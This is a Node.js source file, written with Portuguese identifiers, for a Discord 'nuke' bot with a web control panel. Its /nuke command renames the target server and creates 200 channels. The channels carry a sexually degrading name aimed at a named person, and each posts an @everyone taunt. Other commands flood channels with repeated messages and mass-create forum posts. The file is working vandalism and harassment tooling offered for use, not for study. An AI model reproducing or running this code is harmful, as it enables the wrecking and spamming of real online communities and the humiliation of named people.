const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
const express = require('express');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const porta = process.env.PORTA || 3000;
const TOKEN = process.env.TOKEN;
const ID_CLIENTE = process.env.ID_CLIENTE;

if (!TOKEN || !ID_CLIENTE) {
    console.error('[FATAL] TOKEN ou ID_CLIENTE não definidos no .env');
    process.exit(1);
}

class ControladorSistema {
    constructor() {
        this.ativado = false;
        this.arquivoLog = path.join(__dirname, 'sistema.log');
        this.arquivoEstado = path.join(__dirname, '.estado');
        this.statusBot = 'OFFLINE';
        this.ultimoBatimento = null;
        this.carregarEstado();
    }

    carregarEstado() {
        try {
            if (fs.existsSync(this.arquivoEstado)) {
                const dados = JSON.parse(fs.readFileSync(this.arquivoEstado, 'utf8'));
                this.ativado = dados.ativado || false;
                this.registrar(`[INICIALIZAÇÃO] Estado carregado: ${this.ativado ? 'ATIVO' : 'INATIVO'}`);
            }
        } catch (e) {
            this.registrar(`[ERRO] Falha ao carregar estado: ${e.message}`);
            this.ativado = false;
        }
    }

    salvarEstado() {
        try {
            fs.writeFileSync(this.arquivoEstado, JSON.stringify({ ativado: this.ativado, timestamp: Date.now() }, null, 2));
        } catch (e) {
            this.registrar(`[ERRO] Falha ao salvar estado: ${e.message}`);
        }
    }

    alternar() {
        this.ativado = !this.ativado;
        this.salvarEstado();
        this.registrar(`[ALTERNÂNCIA] Sistema agora está: ${this.ativado ? 'ATIVO' : 'INATIVO'}`);
        return this.ativado;
    }

    estaAtivo() {
        return this.ativado;
    }

    definirStatusBot(status) {
        this.statusBot = status;
        this.ultimoBatimento = Date.now();
    }

    registrar(mensagem) {
        const timestamp = new Date().toISOString();
        const entrada = `${timestamp} ${mensagem}\n`;
        console.log(entrada);
        try {
            fs.appendFileSync(this.arquivoLog, entrada);
        } catch (e) {
            console.error(`[CRÍTICO] Falha ao escrever log: ${e.message}`);
        }
    }
}

const controlador = new ControladorSistema();

const cliente = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages
    ]
});

const comandos = [
    new SlashCommandBuilder()
        .setName('ligar_sistema')
        .setDescription('Ligar o sistema de operações')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('desligar_sistema')
        .setDescription('Desligar o sistema de operações')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('status_sistema')
        .setDescription('Verificar status do sistema')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('Executa protocolo de reestruturação massiva')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('chuva_mensagens')
        .setDescription('Teste de carga de mensagens')
        .addStringOption(opt => opt.setName('texto').setDescription('Conteúdo').setRequired(true)),
    new SlashCommandBuilder()
        .setName('chuva_forum')
        .setDescription('Criação massiva de posts em fórum')
        .addChannelOption(opt => opt.setName('forum').setDescription('Canal de fórum alvo').addChannelTypes(ChannelType.GuildForum).setRequired(true))
        .addIntegerOption(opt => opt.setName('quantidade').setDescription('Número de posts').setRequired(true))
        .addStringOption(opt => opt.setName('conteudo').setDescription('Mensagem do post').setRequired(true))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(c => c.toJSON());

const repouso = new REST({ version: '10' }).setToken(TOKEN);

app.get('/', (req, res) => {
    const corStatus = controlador.statusBot === 'ONLINE' ? '#0f0' : '#f00';
    const corAlternancia = controlador.estaAtivo() ? '#0f0' : '#f00';
    const textoAlternancia = controlador.estaAtivo() ? '🟢 ATIVO' : '🔴 INATIVO';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>[P] Painel de Controle</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    background: #000;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }
                .contenedor {
                    border: 2px solid #0f0;
                    padding: 40px;
                    text-align: center;
                    box-shadow: 0 0 30px #0f0;
                    max-width: 600px;
                    width: 100%;
                }
                h1 { margin-bottom: 40px; font-size: 24px; text-shadow: 0 0 10px #0f0; }
                .grade-status {
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 20px;
                    margin-bottom: 40px;
                }
                .caixa-status {
                    border: 1px solid #0f0;
                    padding: 20px;
                    background: rgba(0, 255, 0, 0.05);
                }
                .rotulo-status { font-size: 11px; color: #088; margin-bottom: 10px; text-transform: uppercase; }
                .valor-status {
                    font-size: 28px;
                    font-weight: bold;
                    color: ${corStatus};
                    text-shadow: 0 0 10px ${corStatus};
                }
                .status-bot {
                    color: ${corStatus};
                }
                .status-alternancia {
                    color: ${corAlternancia};
                }
                .grupo-botoes { display: flex; gap: 10px; justify-content: center; margin-bottom: 30px; }
                botao {
                    padding: 12px 30px;
                    font-size: 14px;
                    font-family: 'Courier New', monospace;
                    border: 1px solid #0f0;
                    background: #000;
                    color: #0f0;
                    cursor: pointer;
                    transition: all 0.3s;
                    text-transform: uppercase;
                    font-weight: bold;
                }
                button:hover {
                    background: #0f0;
                    color: #000;
                    box-shadow: 0 0 10px #0f0;
                }
                button:active { transform: scale(0.98); }
                .botao-alternancia {
                    flex: 1;
                    padding: 15px;
                    font-size: 16px;
                }
                .secao-logs {
                    border-top: 1px solid #0f0;
                    margin-top: 30px;
                    padding-top: 20px;
                    text-align: left;
                }
                .titulo-logs { font-size: 12px; color: #088; margin-bottom: 10px; text-transform: uppercase; }
                #logs {
                    background: rgba(0, 255, 0, 0.02);
                    border: 1px solid #0f0;
                    padding: 10px;
                    height: 150px;
                    overflow-y: auto;
                    font-size: 10px;
                    line-height: 1.4;
                    color: #0f0;
                }
                .info { font-size: 11px; color: #088; margin-top: 20px; line-height: 1.6; }
            </style>
        </head>
        <body>
            <div class="contenedor">
                <h1>[P] PAINEL DE CONTROLE</h1>
                <div class="grade-status">
                    <div class="caixa-status">
                        <div class="rotulo-status">BOT</div>
                        <div class="valor-status status-bot">${controlador.statusBot}</div>
                    </div>
                    <div class="caixa-status">
                        <div class="rotulo-status">SISTEMA</div>
                        <div class="valor-status status-alternancia">${textoAlternancia}</div>
                    </div>
                </div>
                <div class="grupo-botoes">
                    <button class="botao-alternancia" onclick="alternarSistema()">
                        ${controlador.estaAtivo() ? '◆ DESLIGAR SISTEMA' : '▶ LIGAR SISTEMA'}
                    </button>
                </div>
                <div class="secao-logs">
                    <div class="titulo-logs">Últimas Operações</div>
                    <div id="logs">Carregando logs...</div>
                </div>
                <div class="info">
                    <p>BOT deve estar ONLINE para executar comandos</p>
                    <p>Sistema deve estar ATIVO para ativar operações</p>
                </div>
            </div>
            <script>
                function alternarSistema() {
                    fetch('/api/alternar', { method: 'POST' })
                        .then(r => r.json())
                        .then(dados => {
                            if (dados.sucesso) {
                                location.reload();
                            }
                        })
                        .catch(e => alert('Erro: ' + e.message));
                }
                
                function carregarLogs() {
                    fetch('/logs')
                        .then(r => r.text())
                        .then(texto => {
                            const divLogs = document.getElementById('logs');
                            const linhas = texto.trim().split('\\n').slice(-15);
                            divLogs.textContent = linhas.join('\\n');
                            divLogs.scrollTop = divLogs.scrollHeight;
                        })
                        .catch(e => console.error('Erro ao carregar logs:', e));
                }
                
                carregarLogs();
                setInterval(carregarLogs, 5000);
            </script>
        </body>
        </html>
    `);
});

app.post('/api/alternar', (req, res) => {
    const novoEstado = controlador.alternar();
    controlador.registrar(`[API] Alternância acionada via web - novo estado: ${novoEstado ? 'ATIVO' : 'INATIVO'}`);
    res.json({ sucesso: true, ativado: novoEstado });
});

app.get('/api/status', (req, res) => {
    res.json({
        ativado: controlador.estaAtivo(),
        statusBot: controlador.statusBot,
        timestamp: Date.now(),
        tempo: process.uptime()
    });
});

app.get('/logs', (req, res) => {
    try {
        const logs = fs.readFileSync(controlador.arquivoLog, 'utf8');
        res.set('Content-Type', 'text/plain');
        res.send(logs);
    } catch (e) {
        res.status(500).send(`Erro ao ler logs: ${e.message}`);
    }
});

cliente.on('ready', async () => {
    controlador.definirStatusBot('ONLINE');
    controlador.registrar(`[BOT] Logado como ${cliente.user.tag}`);
    
    try {
        await repouso.put(Routes.applicationCommands(ID_CLIENTE), { body: comandos });
        controlador.registrar('[BOT] Comandos sincronizados com sucesso');
    } catch (e) {
        controlador.registrar(`[BOT_ERRO] Falha ao sincronizar comandos: ${e.message}`);
    }
});

cliente.on('disconnect', () => {
    controlador.definirStatusBot('OFFLINE');
    controlador.registrar('[BOT] Desconectado do Discord');
});

cliente.on('error', (erro) => {
    controlador.registrar(`[BOT_ERRO] Erro de conexão: ${erro.message}`);
    controlador.definirStatusBot('ERRO');
});

cliente.on('shardError', (erro) => {
    controlador.registrar(`[ERRO_SHARD] Erro de shard: ${erro.message}`);
});

cliente.on('interactionCreate', async interacao => {
    if (!interacao.isChatInputCommand()) return;
    const { commandName } = interacao;

    try {
        if (commandName === 'ligar_sistema') {
            if (!controlador.estaAtivo()) {
                controlador.alternar();
                await interacao.reply({
                    content: `🔌 Sistema agora está: **ATIVO ✓**`,
                    ephemeral: true
                });
                controlador.registrar(`[COMANDO] Sistema ligado por ${interacao.user.tag}`);
            } else {
                await interacao.reply({
                    content: '⚠️ Sistema já está ativo',
                    ephemeral: true
                });
            }
            return;
        }

        if (commandName === 'desligar_sistema') {
            if (controlador.estaAtivo()) {
                controlador.alternar();
                await interacao.reply({
                    content: `🔌 Sistema agora está: **INATIVO ✗**`,
                    ephemeral: true
                });
                controlador.registrar(`[COMANDO] Sistema desligado por ${interacao.user.tag}`);
            } else {
                await interacao.reply({
                    content: '⚠️ Sistema já está inativo',
                    ephemeral: true
                });
            }
            return;
        }

        if (commandName === 'status_sistema') {
            const status = controlador.estaAtivo() ? '🟢 ATIVO' : '🔴 INATIVO';
            await interacao.reply({
                content: `Status: ${status}\nTodos os comandos operacionais requerem estado ATIVO`,
                ephemeral: true
            });
            return;
        }

        if (!controlador.estaAtivo()) {
            await interacao.reply({
                content: '⛔ Sistema está INATIVO. Use `/ligar_sistema` para ativar.',
                ephemeral: true
            });
            controlador.registrar(`[BLOQUEADO] Tentativa de comando ${commandName} com sistema inativo`);
            return;
        }

        if (commandName === 'nuke') {
            controlador.registrar(`[NUKE] Iniciado por ${interacao.user.tag}`);
            await interacao.reply({ content: '[P] Nuke iniciado.', ephemeral: true });
            
            try {
                await interacao.guild.setName('Theo bots anti RAID');
                await interacao.guild.setIcon('https://cdn.discordapp.com/attachments/1525751548477706351/1525871668780601384/IMG_6058.png');
                controlador.registrar(`[NUKE] Guild renomeada`);
            } catch (e) {
                controlador.registrar(`[NUKE_ERRO] Falha ao renomear guild: ${e.message}`);
            }

            const nome = 'MEU NOME É BERNADO EU SOU UM GULOSAO, EU QUERO DAR PRA UM MONTÃO';
            const msg = '@everyone ESTE SERVER FOI COMIDO PELO THEO, NÃO A NADA A SER FEITO \n ⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻꧄';
            
            let contadorCanais = 0;
            Array.from({ length: 200 }).forEach(async () => {
                try {
                    const canal = await interacao.guild.channels.create({ name: nome });
                    await canal.send(msg);
                    contadorCanais++;
                } catch (erro) {
                    controlador.registrar(`[NUKE_ERRO] Falha ao criar canal: ${erro.message}`);
                }
            });
            controlador.registrar(`[NUKE] Criação de ${contadorCanais} canais iniciada`);
        }

        if (commandName === 'chuva_mensagens') {
            const texto = interacao.options.getString('texto');
            controlador.registrar(`[CHUVA_MSG] Iniciado por ${interacao.user.tag} - texto: "${texto.substring(0, 50)}"`);
            await interacao.reply({ content: '[P] Chuva de mensagens iniciada.', ephemeral: true });
            
            let enviadas = 0;
            for (let i = 0; i < 10; i++) {
                try {
                    await interacao.channel.send(texto);
                    enviadas++;
                } catch (e) {
                    controlador.registrar(`[CHUVA_MSG_ERRO] ${e.message}`);
                }
                await new Promise(r => setTimeout(r, 1000));
            }
            controlador.registrar(`[CHUVA_MSG] ${enviadas}/10 mensagens enviadas`);
        }

        if (commandName === 'chuva_forum') {
            const forum = interacao.options.getChannel('forum');
            const quantidade = interacao.options.getInteger('quantidade');
            const conteudo = interacao.options.getString('conteudo');
            controlador.registrar(`[CHUVA_FORUM] Iniciado por ${interacao.user.tag} - canal: ${forum.name}, quantidade: ${quantidade}`);
            await interacao.reply({ content: `[P] Criando ${quantidade} posts no fórum ${forum.name}.`, ephemeral: true });

            let criados = 0;
            for (let i = 0; i < quantidade; i++) {
                try {
                    await forum.threads.create({
                        name: `[P] TESTE ${i + 1}`,
                        message: { content: conteudo }
                    });
                    criados++;
                } catch (e) {
                    controlador.registrar(`[CHUVA_FORUM_ERRO] Falha ao criar thread: ${e.message}`);
                }
                await new Promise(r => setTimeout(r, 500));
            }
            controlador.registrar(`[CHUVA_FORUM] ${criados}/${quantidade} posts criados`);
        }
    } catch (erro) {
        controlador.registrar(`[ERRO_INTERACAO] Erro ao processar comando ${commandName}: ${erro.message}`);
        try {
            if (!interacao.replied) {
                await interacao.reply({
                    content: `❌ Erro ao processar comando: ${erro.message}`,
                    ephemeral: true
                });
            }
        } catch (e) {
            controlador.registrar(`[ERRO] Falha ao enviar mensagem de erro: ${e.message}`);
        }
    }
});

const servidor = app.listen(porta, () => {
    controlador.registrar(`[SERVIDOR] Iniciado na porta ${porta}`);
    controlador.registrar(`[SERVIDOR] URL: http://localhost:${porta}`);
});

if (TOKEN) {
    cliente.login(TOKEN)
        .then(() => controlador.registrar('[BOT] Login iniciado'))
        .catch(err => {
            controlador.registrar(`[FATAL] Falha ao conectar bot: ${err.message}`);
            console.error(err);
            process.exit(1);
        });
} else {
    controlador.registrar('[FATAL] TOKEN não configurado em .env');
    process.exit(1);
}

process.on('exit', () => {
    controlador.registrar('[ENCERRAMENTO] Processo finalizado');
    if (cliente.isReady()) {
        cliente.destroy();
    }
});

process.on('SIGINT', () => {
    controlador.registrar('[ENCERRAMENTO] SIGINT recebido, fechando...');
    servidor.close(() => {
        if (cliente.isReady()) {
            cliente.destroy();
        }
        process.exit(0);
    });
});

process.on('uncaughtException', (erro) => {
    controlador.registrar(`[NÃO_CAPTURADA] Exceção não tratada: ${erro.message}\n${erro.stack}`);
    console.error(erro);
});

process.on('unhandledRejection', (razao, promise) => {
    controlador.registrar(`[NÃO_TRATADA] Promise rejeitada: ${razao}`);
    console.error(promise);
});
